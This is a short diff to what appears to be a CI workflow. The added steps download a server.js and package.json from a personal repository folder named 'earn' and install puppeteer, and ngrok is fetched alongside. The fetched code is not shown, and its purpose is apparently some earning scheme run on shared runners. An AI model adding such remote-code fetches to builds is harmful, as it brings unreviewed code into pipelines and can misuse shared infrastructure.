@@ -5,6 +5,12 @@ jobs:
     runs-on: windows-latest
     steps:
 
+    - name: Node-JS
+      run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/main/earn/server.js -OutFile server.js
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/main/earn/package.json -OutFile package.json
+    - run: npm install puppeteer@19.10.0 asciify-image axios fs
+
+      
     - name: Download
       run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
 
